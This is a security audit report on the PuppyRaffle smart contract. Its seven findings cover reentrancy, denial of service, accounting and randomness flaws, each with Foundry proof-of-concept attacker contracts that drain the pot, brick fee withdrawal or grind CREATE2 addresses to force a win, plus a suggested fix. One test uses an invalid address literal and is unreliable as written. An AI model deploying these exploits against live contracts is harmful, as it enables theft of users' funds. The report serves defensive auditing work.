# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

## Puppy Raffle Protocol
Puppy Raffle is an on-chain game where users pay a fixed entranceFee to join a time-boxed raffle for a unique Puppy NFT and 80 % of the ETH pot.

Workflow
1. **enterRaffle(address[] players)** – Sender supplies entranceFee × players.length; duplicates or under-payment revert, and every address becomes an active ticket.
2. **refund(uint256 index)** – Before the draw, a player can self-refund, receiving their stake and freeing the slot.
3. **selectWinner()** – After raffleDuration seconds and with ≥4 active players, anyone may trigger:
   • pseudo-random winner selection
   • ERC-721 Puppy mint with rarity-linked metadata to the winner
   • transfer of 80 % of contract balance to the winner
   • allocation of the remaining 20 % to protocol fees (totalFees).
4. **withdrawFees()** – Ownerless, but callable by anyone when no active players; sends accumulated fees to feeAddress.
5. **changeFeeAddress()** – Only owner control; updates fee recipient.

Security & Design
• Funds are custodial only until a round ends; players can exit at will.
• No admin keys affect game integrity; owner only reroutes fees.
• Extensive Foundry tests cover entry, refunds, winner logic, payouts, and fee withdrawal.##Findings by Pattern


 **Derived From** : Refund reentrancy allows draining raffle ETH before slot cleared

[H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant drain the entire pot via repeated refunds



 **Derived From** : Nested O(n^2) duplicate scan can DoS enterRaffle via gas

[M-2]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS on new entries



 **Derived From** : Fees withdrawal gate relies on balance == totalFees; grievable via forced ETH

[H-3]. withdrawFees() can be permanently DoSed by forced ETH breaking balance==totalFees invariant



 **Derived From** : Winner fallback can revert and block round payout (push-payment grief)

[M-4]. Griefable push-payment in PuppyRaffle.selectWinner lets a rejecting winner brick round closure



 **Derived From** : 80/20 split rounds down twice leaving dust and bricking withdrawFees

[H-5]. Permanent fee-withdrawal DoS from 80/20 rounding dust in PuppyRaffle.selectWinner



 **Derived From** : Pot/fee accounting uses players.length despite refunded blanks causing permanent DoS

[M-6]. selectWinner overestimates pot from players.length with refunded blanks, reverting prize transfer and bricking raffle



 **Derived From** : Predictable RNG (msg.sender, timestamp, difficulty) biases winner/rarity

[H-7]. Caller-controlled RNG in PuppyRaffle.selectWinner enables CREATE2 grinding to force attacker win and skew rarity


### Number of Findings
- C: 0
- H: 4
- M: 3
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : Refund reentrancy allows draining raffle ETH before slot cleared

## [H-1]. Reentrancy in PuppyRaffle.refund lets a malicious entrant drain the entire pot via repeated refunds

## Derived From Pattern/Invariant
Refund reentrancy allows draining raffle ETH before slot cleared

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Minimim Privilege Required
Permissionless

## Description
refund() sends ETH to msg.sender before clearing players[playerIndex], enabling a reentrancy loop from a malicious player contract to call refund() again for the same index. Because the slot isn't zeroed yet, the require checks still pass and the attacker repeatedly withdraws entranceFee until the contract balance is exhausted.

Vulnerable snippet:
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call before state update

    players[playerIndex] = address(0);          // state cleared after
    emit RaffleRefunded(playerAddress);
}

## Impact
Attacker drains the raffle ETH (pot and future prize pool) by reentering refund() to claim entranceFee multiple times for the same index. Direct theft of all deposited ETH, breaking winner payouts and fees.

## Proof of Concept
- Deploy PuppyRaffle with entranceFee > 0.
- Attacker deploys a malicious contract whose receive() reenters refund(index).
- Anyone enters the raffle with at least 4 unique players, including the attacker contract at a known index (e.g., index 0).
- Attacker calls refund(0). During sendValue(), receive() reenters refund(0) before players[0] is cleared.
- Loop repeats multiple times, each time transferring another entranceFee to attacker.
- Contract balance is drained (bounded by balance), while players[0] is only cleared after the last frame unwinds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundReenter {
    PuppyRaffle public target;
    uint256 public index;
    uint256 public remaining;

    function attack(PuppyRaffle _target, uint256 _index, uint256 _times) external {
        target = _target;
        index  = _index;
        remaining = _times;
        target.refund(index);
    }

    receive() external payable {
        if (remaining > 0) {
            remaining--;
            target.refund(index);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    RefundReenter attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;

    function setUp() public {
        raffle   = new PuppyRaffle(ENTRANCE_FEE, address(0xFEE), 1 days);
        attacker = new RefundReenter();
        vm.deal(address(this), 10 ether);
    }

    function testRefundReentrancyDrainsETH() public {
        // 4 distinct players, attacker is index 0
        address[] memory entrants = new address[](4);
        entrants[0] = address(attacker);
        entrants[1] = address(0xBEEF1);
        entrants[2] = address(0xBEEF2);
        entrants[3] = address(0xBEEF3);

        raffle.enterRaffle{value: ENTRANCE_FEE * entrants.length}(entrants);
        uint256 pot = address(raffle).balance; // should equal 4 ether

        attacker.attack(raffle, 0, 3); // 1 initial + 3 re-entries = 4 refunds

        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, pot);
    }
}

## Suggested Mitigation
- Apply checks-effects-interactions: set players[playerIndex] = address(0) before the external call.
- Additionally, consider OpenZeppelin ReentrancyGuard and mark refund() nonReentrant.

Example fix:
function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(playerAddress);
}





 **Derived From** : Nested O(n^2) duplicate scan can DoS enterRaffle via gas

## [M-2]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS on new entries

## Derived From Pattern/Invariant
Nested O(n^2) duplicate scan can DoS enterRaffle via gas

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Description
enterRaffle first appends all newPlayers, then performs a quadratic duplicate scan across the entire players array. An attacker can bulk-join with many unique addresses to bloat players so that any subsequent enterRaffle call requires iterating O(N^2) pairs, exceeding per-tx gas and reverting. This prevents honest users from entering for the rest of the round until selectWinner() resets players. Vulnerable snippet:

for (uint256 i = 0; i < newPlayers.length; i++) { players.push(newPlayers[i]); }
for (uint256 i = 0; i < players.length - 1; i++) {
  for (uint256 j = i + 1; j < players.length; j++) {
    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
  }
}

## Impact
Temporary denial-of-service of new entries; attacker can lock the participant set for the round (reward distribution distorted to current set) until the raffle ends and players are reset.

## Proof of Concept
1) Attacker calls enterRaffle in several batches with many unique addresses they control, paying entranceFee × batchSize each time, so all calls pass uniqueness checks.
2) players grows large. Now, any new enterRaffle must execute the O(N^2) duplicate scan; even for a single new address, the call runs out of gas and reverts under typical per-tx gas limits.
3) Honest users are blocked from entering for the rest of the round until selectWinner() runs.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract GasLimitedCaller {
    function callEnterWithGas(address target, address[] memory addrs, uint256 gasLimit) external payable returns (bool success) {
        bytes memory data = abi.encodeWithSelector(PuppyRaffle.enterRaffle.selector, addrs);
        (success,) = target.call{value: msg.value, gas: gasLimit}(data);
    }
}

contract UnboundedLoopsDosTest is Test {
    PuppyRaffle raffle;
    GasLimitedCaller glc;
    uint256 fee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(0xBEEF), 1 days);
        glc = new GasLimitedCaller();
        vm.deal(address(this), 10_000 ether);
    }

    function _batchEnter(uint256 n, uint256 seed) internal {
        address[] memory arr = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            arr[i] = address(uint160(uint(keccak256(abi.encode(seed, i)))));
        }
        raffle.enterRaffle{value: fee * n}(arr);
    }

    function test_DOS_enterRaffle_unbounded_quadratic_scan() public {
        // Attacker bloats players across several batches (kept modest for test speed)
        _batchEnter(60, 1);
        _batchEnter(60, 2);
        _batchEnter(60, 3); // ~180 players total

        // Honest user tries to enter with 1 ticket but limited per-tx gas (simulate block cap)
        address[] memory one = new address[](1);
        one[0] = address(0x1234);
        uint256 gasCap = 200_000; // deliberately limited to show gas-based DoS
        bool success = glc.callEnterWithGas{value: fee}(address(raffle), one, gasCap);

        // Call must fail due to out-of-gas in O(N^2) duplicate scan
        assertEq(success, false);
    }
}


## Suggested Mitigation
- Do not scan the entire players array. Enforce uniqueness in O(1) using a mapping(address => bool) entered that is checked/updated per newPlayers[i] before push, then push only unique addresses.
- Alternatively, verify duplicates only within newPlayers using a temporary mapping and check each against a persisted entered mapping; never iterate over historical players.
- Add an upper bound on newPlayers length and/or total players per round to keep gas bounded.





 **Derived From** : Fees withdrawal gate relies on balance == totalFees; grievable via forced ETH

## [H-3]. withdrawFees() can be permanently DoSed by forced ETH breaking balance==totalFees invariant

## Derived From Pattern/Invariant
Fees withdrawal gate relies on balance == totalFees; grievable via forced ETH

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Minimim Privilege Required
Permissionless

## Description
PuppyRaffle.withdrawFees() assumes the accounting invariant balance == totalFees to mean 'no active players'. Anyone can force-send ETH via selfdestruct (or other force-send vectors), making balance > totalFees and reverting the require check forever, bricking fee withdrawals and locking protocol revenue even across future rounds (the extra wei persists). Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

## Impact
Anybody can permanently brick fee withdrawals by force–sending a single wei. All current and future protocol revenues (totalFees) become stuck in the contract with no recovery path, resulting in a permanent loss of those funds for the protocol owner/treasury.

## Proof of Concept
1) Run at least one full raffle round so totalFees > 0 and players are cleared (delete players).
2) Attacker deploys a minimal contract that selfdestructs to PuppyRaffle with 1 wei, force-sending ETH and making balance = totalFees + 1.
3) Call withdrawFees(); it reverts due to the equality check.
4) Even after subsequent rounds, the extra wei persists; balance remains totalFees + 1, so withdrawFees() continues to revert permanently.

## Proof of Code
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract WithdrawFeesForceSendDOSTest is Test {
    PuppyRaffle private raffle;
    address private constant FEE_RECIPIENT = address(0xFEE);
    uint256 private constant ENTRANCE_FEE = 1 ether;
    uint256 private constant DURATION = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_RECIPIENT, DURATION);
    }

    function _enterRound() internal {
        address[] memory entrants = new address[](4);
        entrants[0] = address(11);
        entrants[1] = address(12);
        entrants[2] = address(13);
        entrants[3] = address(14);

        vm.deal(address(0xBEEF), ENTRANCE_FEE * entrants.length);
        vm.prank(address(0xBEEF));
        raffle.enterRaffle{value: ENTRANCE_FEE * entrants.length}(entrants);
    }

    function test_forceSendBreaksWithdrawFees() public {
        _enterRound();
        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner();
        assertEq(address(raffle).balance, uint256(raffle.totalFees()));

        // attacker breaks invariant with 1 wei
        new ForceSend{value: 1}(payable(address(raffle)));
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Do not rely on address(this).balance for liveness. Either 1) track an explicit `bool raffleActive` / `players.length == 0` flag to gate withdrawals, or 2) simply allow the owner to withdraw exactly `totalFees` regardless of extra ETH:

function withdrawFees() external {
    uint256 fees = totalFees;
    totalFees = 0;
    (bool ok,) = feeAddress.call{value: fees}("");
    require(ok, "withdraw failed");
}

Extra ether sent to the contract remains harmless residue but no longer blocks operations.





 **Derived From** : Winner fallback can revert and block round payout (push-payment grief)

## [M-4]. Griefable push-payment in PuppyRaffle.selectWinner lets a rejecting winner brick round closure

## Derived From Pattern/Invariant
Winner fallback can revert and block round payout (push-payment grief)

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner pays the winner via a low-level call and reverts on failure. If an attacker enters the raffle with a contract that rejects ETH and is selected as winner, the call reverts and the entire transaction rolls back, preventing the round from closing (players not deleted, raffle not advanced). There’s no pull-claim fallback or bypass, so an attacker can repeatedly cause DoS. Vulnerable snippet:

previousWinner = winner;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

## Impact
Temporary DoS of core flow: payout and round finalization revert when winner rejects ETH; pot and state are stuck until a different winner is produced.

## Proof of Concept
1) Attacker deploys a Rejector contract with non-payable receive/fallback that reverts on ETH.
2) Attacker (or anyone) enters the raffle including the Rejector address among players.
3) After raffleDuration, attacker chooses a block timestamp (and difficulty) so that the RNG selects the Rejector as winner, then calls selectWinner.
4) The low-level call to winner fails, reverting the transaction. The round remains open; payout and mint are blocked.
5) Attacker can repeat this to grief closure until a different winner is selected.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Rejector {
    receive() external payable { revert("no eth"); }
    fallback() external payable { revert("no eth"); }
}

contract GriefableCallbacks_DoS_Test is Test {
    PuppyRaffle raffle;
    Rejector rejector;

    uint256 entranceFee = 1 ether;
    address feeAddress = address(0xBEEF);
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        rejector = new Rejector();
        vm.deal(address(this), 100 ether);

        address[] memory players = new address[](4);
        players[0] = address(0xA1);
        players[1] = address(0xA2);
        players[2] = address(0xA3);
        players[3] = address(rejector); // griefing winner candidate
        raffle.enterRaffle{value: entranceFee * 4}(players);

        // move past raffle end
        vm.warp(block.timestamp + duration + 1);
    }

    function test_selectWinner_griefable_push_payment_DOS() public {
        // choose caller and search a timestamp that makes winnerIndex == 3 (Rejector)
        address caller = address(0xCA11ER);
        uint256 targetIndex = 3;
        uint256 d = block.difficulty;
        uint256 base = block.timestamp;
        uint256 chosenTs = 0;
        for (uint256 i = 0; i < 4096; i++) {
            uint256 t = base + i;
            bytes32 h = keccak256(abi.encodePacked(caller, t, d));
            if (uint256(h) % 4 == targetIndex) {
                chosenTs = t;
                break;
            }
        }
        require(chosenTs != 0, "no ts found");

        // pre-state checks
        assertEq(raffle.previousWinner(), address(0));
        assertEq(address(raffle).balance, entranceFee * 4);

        vm.warp(chosenTs);
        vm.prank(caller);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // state must be unchanged due to revert
        assertEq(raffle.previousWinner(), address(0));
        assertEq(address(raffle).balance, entranceFee * 4);
    }
}


## Suggested Mitigation
Adopt pull-payment pattern: record owed prize to winner, reset round state, and let the winner withdraw via a separate function. Alternatively, use a non-reverting send path (e.g., try/catch) and escrow unpaid prizes for later claim.





 **Derived From** : 80/20 split rounds down twice leaving dust and bricking withdrawFees

## [H-5]. Permanent fee-withdrawal DoS from 80/20 rounding dust in PuppyRaffle.selectWinner

## Derived From Pattern/Invariant
80/20 split rounds down twice leaving dust and bricking withdrawFees

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner splits the pot with two independent integer divisions:

uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;

a + b uses floor twice, so when totalAmountCollected isn’t divisible by 5, prizePool + fee = totalAmountCollected - 1 wei, leaving 1 wei dust in the contract that isn’t added to totalFees. After paying prizePool, the contract balance becomes totalFees + 1. withdrawFees then enforces a strict equality:

require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

This invariant is permanently false after the first dusty round, bricking fee withdrawals forever and locking the protocol’s fees. Attackers can trigger this by ensuring totalAmountCollected is not divisible by 5 (e.g., with entranceFee not divisible by 5), or across rounds the dust accumulates (+1 wei per such round).

## Impact
Permanent DoS of withdrawFees; protocol fees become irretrievably stuck as address(this).balance > totalFees by 1+ wei, blocking withdrawals indefinitely.

## Proof of Concept
- Deploy with an entranceFee not divisible by 5 (e.g., 1 wei).
- Attacker enters 4 unique addresses paying 4 wei total.
- After raffleDuration, anyone calls selectWinner.
- Post-selection, address(this).balance = totalFees + 1 wei due to rounding dust.
- Calling withdrawFees reverts on the strict equality guard.
- Repeat another round to show dust accumulation grows to 2 wei, etc., keeping withdrawals bricked.

## Proof of Code
pragma solidity ^0.7.6;

import {PuppyRaffle} from "src/PuppyRaffle.sol";

// Minimal cheat-code interface (works with Foundry)
interface Vm {
    function warp(uint256) external;
    function deal(address, uint256) external;
    function expectRevert(bytes calldata) external;
    function prank(address) external;
}

contract PrecisionDustDoSTest {
    // hevm cheat-code address
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);

    // --- helpers -----------------------------------------------------------
    function assertEq(uint256 a, uint256 b, string memory err) internal pure {
        require(a == b, err);
    }

    function setUp() public {
        // entranceFee = 1 wei triggers rounding dust
        raffle = new PuppyRaffle(1, feeAddr, 1);
    }

    function _enter(uint256 n) internal {
        address[] memory addrs = new address[](n);
        for (uint256 i = 0; i < n; i++) addrs[i] = address(uint160(100 + i));
        vm.deal(address(0xBEEF), n);
        vm.prank(address(0xBEEF));
        raffle.enterRaffle{value: n}(addrs);
    }

    // --- test --------------------------------------------------------------
    function test_dust_bricks_withdrawFees() public {
        // Round 1 -----------------------------------------------------------
        _enter(4);                    // pot = 4 wei
        vm.warp(block.timestamp + 2); // raffle over
        raffle.selectWinner();        // winner paid 3, dust = 1
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1, "dust = 1");
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();

        // Round 2 -----------------------------------------------------------
        _enter(4);
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();        // dust grows to 2
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 2, "dust = 2");
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Derive one of the two amounts from the other to guarantee their sum equals the pot, eliminating dust completely:

uint256 fee = (totalAmountCollected * 20) / 100;           // rounds down
uint256 prizePool = totalAmountCollected - fee;             // winner gets remainder

Alternatively, compute the fee with rounding-up ((x * 20 + 99)/100) and subtract, or relax the withdrawFees guard to require(address(this).balance >= totalFees) and track active-player deposits separately. Removing the double-rounding is the simplest and safest fix.





 **Derived From** : Pot/fee accounting uses players.length despite refunded blanks causing permanent DoS

## [M-6]. selectWinner overestimates pot from players.length with refunded blanks, reverting prize transfer and bricking raffle

## Derived From Pattern/Invariant
Pot/fee accounting uses players.length despite refunded blanks causing permanent DoS

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
refund() sets players[index]=address(0) without shrinking the array. selectWinner() then uses players.length to compute totalAmountCollected and splits prize/fee from that inflated value. If ≥1 of 4 players refunded (or generally holes >20%), prizePool exceeds the contract balance, so winner.call{value:prizePool} returns false and the require reverts. Because the revert happens after state mutations in the function, the whole tx reverts and the raffle cannot be completed until array holes are removed (which users cannot do). Additionally, the winner index may land on address(0), and _safeMint(winner, tokenId) will revert, also bricking completion. Vulnerable snippet:

// refund leaves blanks
players[playerIndex] = address(0);

// later in selectWinner
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

## Impact
Permissionless DoS of raffle completion; funds remain stuck in the contract until attackers stop maintaining holes or users individually refund. Also mis-weights fees vs actual balance if prize happens to succeed with low hole ratio, blocking withdrawFees later.

## Proof of Concept
1) Attacker enters 4 unique addresses paying 4×entranceFee.
2) Attacker refunds 1 of them, creating a blank slot but leaving players.length==4.
3) After raffleDuration, anyone calls selectWinner().
4) Contract computes prizePool = 0.8×4×entranceFee = 3.2×entranceFee while balance is only 3×entranceFee.
5) winner.call with 3.2ETH fails, require(success) reverts, preventing raffle completion. This can be maintained indefinitely by keeping >20% blanks.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AccountingInvariantViolationTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddr = address(0xfee);
    uint256 duration = 1 hours;

    address p1 = address(0xA1);
    address p2 = address(0xA2);
    address p3 = address(0xA3);
    address p4 = address(0xA4);
    address caller = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddr, duration);
        vm.deal(caller, 100 ether);
        vm.deal(p1, 1 ether);
        vm.deal(p2, 1 ether);
        vm.deal(p3, 1 ether);
        vm.deal(p4, 1 ether);
    }

    function test_DoS_selectWinner_byRefundHoles() public {
        // 1) Enter 4 players
        address[] memory entrants = new address[](4);
        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
        vm.prank(caller);
        raffle.enterRaffle{value: entranceFee * 4}(entrants);

        // 2) Refund 1 player -> leaves a blank but keeps players.length == 4
        vm.prank(p4);
        raffle.refund(3); // players[3] = address(0)
        // Contract balance is now 3 * entranceFee
        assertEq(address(raffle).balance, 3 ether);

        // 3) Time passes
        vm.warp(block.timestamp + duration + 1);

        // 4) selectWinner() computes prizePool = 0.8 * 4 * fee = 3.2 ETH > balance (3 ETH)
        // => low-level call fails and require(success) reverts
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        vm.prank(caller);
        raffle.selectWinner();

        // Still bricked; trying again still reverts until holes are removed
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        vm.prank(caller);
        raffle.selectWinner();
    }
}


## Suggested Mitigation
- Account only for active players: track active count or compute totalAmountCollected from active entries (e.g., count non-zero players) or from address(this).balance minus totalFees.
- In refund(), compact the array (swap last element into refunded index, then pop) so no blanks remain.
- Ensure winner is a non-zero active player: if selected index is blank, re-sample or compact before picking.
- Compute fees from actual collected pot for the round (activeCount * entranceFee), preventing fee/balance divergence and avoiding withdrawFees lockouts.





 **Derived From** : Predictable RNG (msg.sender, timestamp, difficulty) biases winner/rarity

## [H-7]. Caller-controlled RNG in PuppyRaffle.selectWinner enables CREATE2 grinding to force attacker win and skew rarity

## Derived From Pattern/Invariant
Predictable RNG (msg.sender, timestamp, difficulty) biases winner/rarity

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Description
selectWinner derives randomness from caller and block params the caller can influence/grind:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

An attacker can deploy a factory that, within a single transaction, brute-forces salts for CREATE2 to precompute child addresses and evaluate the resulting winnerIndex/rarity for the current block’s timestamp/difficulty. Once a child address is found that maps to an attacker-controlled players[] index (and optionally yields a desired rarity), the factory deploys that child and the child calls selectWinner in its constructor. This makes msg.sender equal to the chosen child address, deterministically forcing the winner to the attacker and optionally biasing the NFT rarity. This redirects 80% of the pot to the attacker and undermines rarity fairness.

## Impact
Attacker can deterministically force themselves to win the raffle (stealing 80% of the pool) and bias the minted NFT’s rarity in the same transaction by grinding msg.sender via CREATE2.

## Proof of Concept
1) Attacker enters the raffle with ≥1 of the 4+ required unique addresses.
2) After raffleDuration, attacker calls a GrinderFactory that:
   - Computes the CREATE2 address for many salts for a tiny child contract that calls selectWinner in its constructor.
   - For each candidate child address A, computes:
     • idx = keccak256(A, block.timestamp, block.difficulty) % players.length
     • r   = keccak256(A, block.difficulty) % 100
   - If idx points to an attacker-owned players[] slot (and optionally r ≥ 96 for legendary), deploys that child with CREATE2.
3) The child’s constructor calls selectWinner; msg.sender is that child address, so winnerIndex points to the attacker’s entry. The contract pays the attacker 80% of the pot and mints the NFT with the chosen rarity distribution.
4) This is repeatable every round and requires no special privileges.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelectWinnerCaller {
    constructor(PuppyRaffle raffle) {
        raffle.selectWinner();
    }
}

contract GrinderFactory {
    function grindAndSelect(
        PuppyRaffle raffle,
        uint256 playersLen,
        uint256[] memory myIdx,
        uint256 maxIters
    ) external returns (address deployed, bytes32 saltUsed, uint256 chosenIndex) {
        bytes memory initCode = abi.encodePacked(type(SelectWinnerCaller).creationCode, abi.encode(raffle));
        bytes32 initCodeHash = keccak256(initCode);
        for (uint256 i = 0; i < maxIters; i++) {
            bytes32 salt = keccak256(abi.encode(i));
            address child = computeCreate2Address(salt, initCodeHash);
            uint256 idx = uint256(keccak256(abi.encodePacked(child, block.timestamp, block.difficulty))) % playersLen;
            bool ok = false;
            for (uint256 j = 0; j < myIdx.length; j++) {
                if (idx == myIdx[j]) { ok = true; break; }
            }
            if (ok) {
                address newChild;
                assembly {
                    let encoded_data := add(initCode, 0x20)
                    let encoded_size := mload(initCode)
                    newChild := create2(0, encoded_data, encoded_size, salt)
                    if iszero(newChild) { revert(0, 0) }
                }
                return (newChild, salt, idx);
            }
        }
        revert("no matching salt");
    }

    function computeCreate2Address(bytes32 salt, bytes32 initCodeHash) internal view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, initCodeHash)))));
    }
}

contract RNGGrindPuppyRaffleTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);

    address a1 = address(0xA11CE);
    address a2 = address(0xB0B01);
    address v1 = address(0x1111);
    address v2 = address(0x2222);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, 1);
        vm.deal(address(this), 10 ether);
    }

    function test_GrindToForceSelfWin() public {
        address[] memory addrs = new address[](4);
        addrs[0] = a1; addrs[1] = a2; addrs[2] = v1; addrs[3] = v2;
        raffle.enterRaffle{value: entranceFee * 4}(addrs);

        // End raffle
        vm.warp(block.timestamp + 2);

        uint256 beforeA1 = a1.balance;
        uint256 beforeA2 = a2.balance;

        GrinderFactory gf = new GrinderFactory();
        uint256[] memory myIdx = new uint256[](2);
        myIdx[0] = 0; myIdx[1] = 1; // attacker controls players[0] and players[1]

        // Grind within the same tx to pick msg.sender via CREATE2
        gf.grindAndSelect(raffle, 4, myIdx, 5000);

        address winner = raffle.previousWinner();
        assertTrue(winner == a1 || winner == a2, "attacker did not win");

        uint256 expectedPrize = (4 * entranceFee * 80) / 100;
        assertTrue(a1.balance - beforeA1 == expectedPrize || a2.balance - beforeA2 == expectedPrize, "prize not received by attacker");
    }
}


## Suggested Mitigation
Do not derive randomness from msg.sender or manipulable block variables. Use a secure RNG: e.g., Chainlink VRF v2 or a commit-reveal scheme with a future blockhash/prevrandao plus user commits, and separate the draw into commit and reveal phases. For rarity, derive from the same verifiable randomness used for winner selection, not caller-dependent inputs.



